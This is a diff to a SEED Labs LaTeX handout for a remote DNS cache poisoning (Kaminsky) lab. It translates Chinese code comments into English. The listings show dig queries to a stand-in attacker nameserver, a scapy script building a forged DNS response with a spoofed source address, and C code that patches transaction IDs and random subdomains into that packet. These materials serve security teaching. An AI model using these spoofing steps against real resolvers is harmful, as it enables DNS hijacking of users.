@@ -10,14 +10,12 @@
 \input{../../common-files/copyright}
 
 \newcommand{\dnsFigs}{./Figs}
-
 \lhead{\bfseries SEED Labs -- 远程DNS缓存中毒攻击实验}
 
 
 \def \code#1 {\fbox{\scriptsize{\texttt{#1}}}}
 
 \begin{document}
-
 \begin{center}
 {\LARGE 远程DNS攻击 (Kaminsky 攻击) 实验}
 
@@ -233,12 +231,11 @@ BIND将转储缓存到默认文件\path{/var/cache/bind/named_dump.db}。
 \end{lstlisting}
 
 下面两个命令与DNS缓存相关，第一个命令将DNS缓存内容转储到之前指定的位置，第二个命令将清除缓存。
-
-
 \begin{lstlisting}
-$ sudo rndc dumpdb -cache    // 转储DNS缓存到指定位置
-$ sudo rndc flush            // 清除DNS缓存
+$ sudo rndc dumpdb -cache    // Dump the DNS cache to the specified location
+$ sudo rndc flush            // Clear DNS cache
 \end{lstlisting}
+
 
 
 \item 
@@ -349,10 +346,10 @@ $ dig ns.attacker32.com
 
 
 \begin{lstlisting}
-// 发送请求到本地DNS服务器，这个请求会前往example.com的官方名称服务器
+// Send a request to the local DNS server, this request will go to the official name server of example.com
 $ dig www.example.com
 
-// 直接向ns.attacker32.com发送请求 
+// Send a request directly to ns.attacker32.com
 $ dig @ns.attacker32.com www.example.com
 \end{lstlisting}
  
@@ -604,10 +601,10 @@ cat /var/cache/bind/dump.db | grep attacker
 
 
 \begin{lstlisting}
-// 询问本地DNS服务器来进行查询
+// Ask the local DNS server for query
 $ dig www.example.com
 
-// 直接请求attacker32名称服务器
+// Direct request to attacker32 name server
 $ dig @ns.attacker32.com www.example.com
 \end{lstlisting}
  
@@ -643,7 +640,7 @@ $ dig @ns.attacker32.com www.example.com
 #!/usr/bin/python3
 from scapy.all import *
 
-# 构造DNS头和内容
+# Construct DNS header and content
 name   = 'twysw.example.com'
 Qdsec  = DNSQR(qname=name)
 Anssec = DNSRR(rrname=name, type='A', rdata='1.1.2.2', ttl=259200)
@@ -651,12 +648,12 @@ dns    = DNS(id=0xAAAA, aa=1, rd=0, qr=1,
              qdcount=1, ancount=1, nscount=0, arcount=0, 
              qd=Qdsec, an=Anssec)
 
-# 构造IP、UDP头以及完整的数据包
+# Construct IP, UDP header and complete data packet
 ip  = IP(dst='10.0.2.7', src='1.2.3.4', chksum=0)
 udp = UDP(dport=33333, sport=53, chksum=0)
 pkt = ip/udp/dns
 
-# 保存数据包到文件
+# Save data package to file
 with open('ip.bin', 'wb') as f:
   f.write(bytes(pkt))
 \end{lstlisting}
@@ -675,13 +672,13 @@ with open('ip.bin', 'wb') as f:
  
 
 \begin{lstlisting}
-  // 修改询问字段的域名 (offset=41)
+  // Modify the domain name of the query field (offset=41)
   memcpy(ip+41, "bbbbb" , 5);
 
-  // 修改回答字段的域名 (offset=64)
+  // Modify the domain name of the answer field (offset=64)
   memcpy(ip+64, "bbbbb" , 5);
 
-  // 修改传输ID字段 (offset=28)
+  // Modify the transmission ID field (offset=28)
   unsigned short id = 1000;
   unsigned short id_net_order = htons(id);
   memcpy(ip+28, &id_net_order, 2);
@@ -696,7 +693,7 @@ with open('ip.bin', 'wb') as f:
 \begin{lstlisting}
 char a[26]="abcdefghijklmnopqrstuvwxyz";
 
-// 生成一个长度为5的随机子域名
+// Generate a random subdomain with a length of 5
 char name[5];
 for (int k=0; k<5; k++)  
    name[k] = a[rand() % 26];
